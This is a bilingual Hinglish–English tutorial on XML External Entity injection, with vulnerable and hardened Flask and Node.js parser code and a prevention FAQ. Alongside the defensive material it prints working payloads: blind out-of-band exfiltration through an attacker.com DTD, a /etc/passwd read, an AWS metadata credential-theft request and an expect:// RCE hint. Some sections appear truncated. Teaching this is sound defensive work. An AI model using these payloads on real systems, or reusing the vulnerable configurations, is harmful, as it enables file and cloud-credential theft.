XML External Entity (XXE) Injection

XML External Entity (XXE) injection tab hota hai jab ek backend API endpoint kisi user-supplied XML document ko weakly-configured parser se evaluate karta hai, jisme Document Type Definition (DTD) aur external general entities enabled hoti hain. Attacker <!ENTITY> ke zariye server ke internal files (file:///etc/passwd) read kar sakta hai, internal services par SSRF kar sakta hai, ya Blind OOB DTD se sensitive data exfiltrate kar sakta hai. XML External Entity (XXE) injection occurs when an API endpoint parses untrusted XML input using a parser whose Document Type Definition (DTD) and external entity resolution features remain enabled. An adversary injects malicious <!ENTITY> definitions to extract arbitrary local server files (such as /etc/passwd), forge internal SSRF HTTP queries to cloud metadata endpoints, or execute Out-Of-Band (OOB) exfiltration.

XML External Entity (XXE) Injection: Mool Siddhant & Overview XML External Entity (XXE) Injection: Architectural Foundations

1.1 XML Document Structure aur DTD External Entities Kya Hain? 1.1 What is XML Structure, DTD, and External Entity Resolution?

XML (Extensible Markup Language) ek structured data format hai jo B2B integrations, invoice processing, SOAP web services, aur legacy enterprise APIs me heavily use hota hai. XML specification me ek feature hota hai jise DTD (Document Type Definition) kehte hain. DTD ka kaam document ka schema validate karna aur Entities define karna hota hai. XML (Extensible Markup Language) is a hierarchical document format ubiquitously deployed in B2B integrations, financial invoices, SAML tokens, and SOAP endpoints. The XML standard specifies Document Type Definitions (DTD) to declare document grammar and reusable variables known as Entities.

Entities do tarah ki hoti hain: Internal Entities (jo XML ke andar hi text replace karti hain) aur External Entities (jo kisi external URI ya local file path se content load karti hain using the SYSTEM identifier). Jab ek backend XML parser bina strict configuration ke external entity resolve karta hai, tab attacker arbitrary system files read kar sakta hai ya internal networks me SSRF trigger kar sakta hai. Entities comprise Internal Entities (in-memory string substitutions) and External Entities (which load content from external URIs or local files using the SYSTEM directive). When an XML parser evaluates untrusted external entities, attackers extract server-side files or trigger Server-Side Request Forgery against internal infrastructure.

Critical Attack Surface: Aaj kal zyadatar modern APIs JSON use karti hain, lekin agar API Gateway ya web framework me Content-Type: application/xml accept ho raha hai (Content-Type sniffing), toh attacker JSON request ko XML me covert karke XXE exploit kar sakta hai! Critical Attack Surface: While modern APIs favor JSON, if the application framework automatically deserializes XML when receiving Content-Type: application/xml, adversaries simply convert JSON payloads into XML with malicious DTD declarations!

XML Parsers, DTD Architecture & Entity Resolution Mechanics XML Parsers, DTD Architecture & Entity Resolution Mechanics

2.1 Document Type Definition (DTD) aur Entity Types 2.1 Document Type Definition (DTD) and Entity Taxonomy

XML me entities variables ki tarah kaam karti hain. DTD document ke starting me <!DOCTYPE root [...]> block me define ki jati hain. Entities teen mukhya types me categorized hoti hain: In XML, entities function as variables declared inside the <!DOCTYPE root [...]> preamble. They are classified into three primary categories:

1. General Internal Entities

Document ke andar static text replacement: <!ENTITY company "CyberLab Inc.">. Reference: &company;.

2. External General Entities (XXE Vector)

Local files ya remote URIs se data fetch karta hai: <!ENTITY file SYSTEM "file:///etc/passwd">. Reference: &file;.

3. Parameter Entities (Blind OOB Vector)

DTD ke andar hi DTD construct karne ke liye use hoti hain: <!ENTITY % param SYSTEM "http://evil.com/dtd">. Reference: %param;.

2.2 Out-Of-Band (Blind XXE) Exfiltration Pipeline 2.2 Out-Of-Band (Blind XXE) Exfiltration Mechanics

Jab API response me koi data reflect nahi hota, tab attacker parameter entities aur external DTDs ka use karke sensitive data remote DNS ya HTTP server par push kar deta hai: When APIs suppress parsed output, attackers deploy nested parameter entities hosted on external DTD servers to exfiltrate files over outbound HTTP/DNS requests:

Step 1: Attacker hosts 'evil.dtd' on their public server:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?stolen=%file;'>">
%eval;
%exfil;

Step 2: Attacker sends initial injection in API Request:
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % loadDtd SYSTEM "http://attacker.com/evil.dtd">
  %loadDtd;
]>
<data>test</data>

Step 3: Target Server parser triggers outgoing HTTP:
GET /?stolen=prod-api-worker-01 HTTP/1.1
Host: attacker.com
2.3 Billion Laughs Attack (XML Entity Expansion DoS) 2.3 Billion Laughs Attack (XML Entity Expansion DoS)

External entities ke bina bhi, recursive internal entities se parser ka CPU aur memory 100% exhaust karke Denial of Service (DoS) kiya ja sakta hai. Ise XML Bomb ya Billion Laughs Attack kehte hain: Even without external entities, recursive internal entity definitions cause exponential memory exhaustion, producing Denial of Service (DoS) termed the XML Bomb:

Scenario 1: Arbitrary File Read (/etc/passwd & .env Disclosure)

High Severity

E-commerce API me invoice parsing endpoint /api/v1/invoice/upload par user XML file upload karta hai. Attacker custom DTD inject karke local server configuration files read karta hai: An e-commerce API invoice endpoint at /api/v1/invoice/upload parses client-uploaded XML files. Response (200 OK): {"invoiceId":"INV-8891", "vendor":"root:x:0:0:root:/root:/bin/bash daemon:x:1:1...", "total": 499.00}

Scenario 2: Cloud Instance Metadata SSRF (AWS IMDSv1 Credential Theft)

Critical Severity

Cloud EC2 container me host ho rahi API XML document evaluate karte waqt link-local IP http://169.254.169.254 par HTTP request fire karti hai, jisse instance IAM role keys exfiltrate ho jati hain: In cloud-hosted services, the entity resolver fetches link-local address http://169.254.169.254, allowing attackers to harvest temporary instance security tokens:

POST /api/v1/profile/import HTTP/1.1 Host: cloud-microservice.internal Content-Type: application/xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE user [ <!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role"> ]> <user> <username>admin</username> <bio>&aws;</bio> </user>

High Severity

Jab API endpoint koi output return nahi karta, tab attacker parameter entities se external DTD invoke karke private configuration file contents Burp Collaborator par exfiltrate karta hai: Where no output is reflected, attackers utilize parameter entities to fetch an external DTD that dispatches system files to a Burp Collaborator instance:

Secure Engineering & Fixes (Python Flask & Node.js) Secure Engineering & Fixes (Python Flask & Node.js)

XXE vulnerabilities ko prevent karne ka universal golden rule hai: XML Parser me DTD (Document Type Definition) aur External Entity resolution ko unconditionally disable karein, ya defusedxml jaisi hardened libraries use karein. The authoritative remediation against XXE is: Completely disable Document Type Definitions (DTDs) and external entity resolution in your XML parser configuration, or standardize on safe parsing packages such as defusedxml.

1. Python Flask Defense: defusedxml vs lxml Hardening
Vulnerable Code Python (Flask / lxml) 
from flask import Flask, request, jsonify
from lxml import etree

app = Flask(__name__)

@app.route('/api/v1/xml/order', methods=['POST'])
def process_order():
    xml_data = request.data
    
    # ❌ VULNERABLE: lxml resolves external entities
    # and permits network/file DTD expansion by default
    parser = etree.XMLParser(resolve_entities=True)
    root = etree.fromstring(xml_data, parser=parser)
    
    item = root.find('item').text
    return jsonify({"status": "processed", "item": item})
❌ resolve_entities=True enables the parser to resolve SYSTEM "file:///etc/passwd" and leak files in the HTTP response.
Secure Remediation Python (Flask / defusedxml) 
from flask import Flask, request, jsonify
import defusedxml.ElementTree as DefusedET
from defusedxml.common import DefusedXmlException

app = Flask(__name__)

@app.route('/api/v1/xml/order', methods=['POST'])
def process_order():
    xml_data = request.data
    try:
        # ✅ SECURE: defusedxml blocks all entity expansion,
        # external DTDs, and Billion Laughs recursion
        root = DefusedET.fromstring(xml_data)
        
        item = root.find('item').text
        return jsonify({"status": "processed", "item": item})
        
    except DefusedXmlException as e:
        return jsonify({"error": "Forbidden XML Entity Detected"}), 400
✅ defusedxml overrides the core parser to immediately reject any DTD entity references, preventing both XXE and XML Bomb DoS.
2. Node.js Express Defense: fast-xml-parser & libxmljs
Vulnerable Code Node.js (Express / libxmljs) 
const express = require('express');
const libxmljs = require('libxmljs');
const app = express();

app.use(express.text({ type: 'application/xml' }));

app.post('/api/v1/xml/order', (req, res) => {
  // ❌ VULNERABLE: noent: true instructs libxmljs to
  // substitute and resolve external entities!
  const xmlDoc = libxmljs.parseXml(req.body, {
    noent: true,   // Replaces entities with values!
    dtdload: true  // Fetches external DTDs!
  });
  
  const item = xmlDoc.get('//item').text();
  res.json({ status: 'processed', item });
});
❌ Setting noent: true and dtdload: true enables full external file evaluation and SSRF.
Secure Remediation Node.js (Express / fast-xml-parser) 
const express = require('express');
const { XMLParser } = require('fast-xml-parser');
const app = express();

app.use(express.text({ type: 'application/xml' }));

// ✅ SECURE: fast-xml-parser does not resolve external entities
// and ignores DTD entity declarations by default
const safeParser = new XMLParser({
  ignoreAttributes: false,
  processEntities: false,  // Prevents entity evaluation
  stopNodes: ["*.dtd"]
});

app.post('/api/v1/xml/order', (req, res) => {
  try {
    const parsedObj = safeParser.parse(req.body);
    const item = parsedObj.order?.item || 'Unknown';
    res.json({ status: 'processed', item });
  } catch (err) {
    res.status(400).json({ error: 'Invalid XML payload' });
  }
});
✅ processEntities: false in fast-xml-parser safely suppresses entity resolution and ignores remote DTD fetch requests.

Frequently Asked Questions (XXE Production Engineering) Frequently Asked Questions (XXE Production Engineering)

Q1: Agar hamari API sirf JSON support karti hai, toh kya hum XXE se 100% safe hain? ▼
Hamesha nahi! Agar aapka web framework (jaise Spring Boot, Rails, ya customized Express middleware) request ke Content-Type: application/xml header ko dekh kar automatically XML deserializer ko call kar deta hai, toh attacker JSON endpoint par XML payload bhej kar XXE trigger kar sakta hai. Isliye Content-Type strict whitelisting zaroori hai.
Q2: XXE aur SSRF me kya sambandh hai? Kya har XXE ek SSRF hota hai? ▼
XXE ek broad vulnerability category hai jo file reading, SSRF, aur DoS teenon cause kar sakti hai. Jab ek XML entity me URI scheme http:// ya https:// use ki jati hai (jaise <!ENTITY ssrf SYSTEM "http://169.254.169.254">), toh parser backend server se internal network request fire karta hai—ye XXE-induced SSRF ban jata hai.
Q3: Parameter Entity (%) aur General Entity (&) me kya antar hai? ▼
General entities document body ke andar &name; ke zariye reference hoti hain. Lekin parameter entities sirf DTD subset ke andar %name; ke roop me use hoti hain. Parameter entities external DTDs include karne aur dynamic nesting karne ke kaam aati hain, jo Blind XXE OOB exfiltration ke liye essential vector hain.
Q4: Python ke standard xml.etree.ElementTree me XXE kaise behave karta hai? ▼
Python 3.8+ me standard xml.etree.ElementTree external general entities ko default roop se resolve nahi karta, lekin ye Billion Laughs DoS (exponential entity expansion) aur local entity expansion se fully protected nahi hota. Isliye production applications me hamesha defusedxml use karne ki recommendation di jati hai.
Q5: Kya WAF (Web Application Firewall) XXE ko effectively block kar sakta hai? ▼
WAFs par puri tarah rely nahi kiya ja sakta kyunki XML encoding tricks (UTF-16, UTF-32, EBCDIC encoding) se WAF signature bypass ho jata hai jabki backend parser multi-byte encoding ko decode karke attack execute kar deta hai. Real fix hamesha parser level par DTD ko disable karna hai.
Q6: Excel (XLSX) aur Word (DOCX) files me XXE kaise chhipa hota hai? ▼
Office Open XML formats (.docx, .xlsx, .pptx) asal me ZIP archives hote hain jinke andar multiple XML files (jaise [Content_Types].xml, word/document.xml) hoti hain. Attacker file ko unzip karta hai, XML me DTD entity daalta hai, aur re-zip karke upload kar deta hai. Agar server unzipping ke baad safe parser use nahi karta, toh XXE trigger ho jata hai.
Q7: Blind XXE me PHP expect:// wrapper ka kya role hota hai? ▼
Agar PHP environment me expect PECL extension loaded hai, toh attacker SYSTEM "expect://id" likhkar seedha Remote Code Execution (RCE) achieve kar sakta hai. Halanki modern PHP me expect extension default me disabled hoti hai.
Q8: Java Spring Boot applications me XXE prevent karne ke liye standard snippet kya hai? ▼
Java DocumentBuilderFactory me DTD completely disable karne ke liye: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); set karein. Is feature ke active hote hi koi bhi document DTD include karne par turant reject ho jata hai.
Q9: SOAP Web Services me XXE attack kaise execute hota hai? ▼
SOAP protocol XML based hota hai. Attacker SOAP envelope ke upar <!DOCTYPE soapenv:Envelope [...]> block daal kar body ke kisi parameter me entity call kar deta hai. Agar SOAP engine DTD processing allow karta hai, toh internal service data leak ho jata hai.
Q10: Billion Laughs Attack ko mitigate karne ke liye memory limit ka kya solution hai? ▼
Parsers me entity expansion limit set ki jati hai (jaise Java me XMLConstants.FEATURE_SECURE_PROCESSING ya Python me defusedxml ka recursion depth counter), jo ek threshold se zyada entity expansion ko instantly terminate kar deta hai.
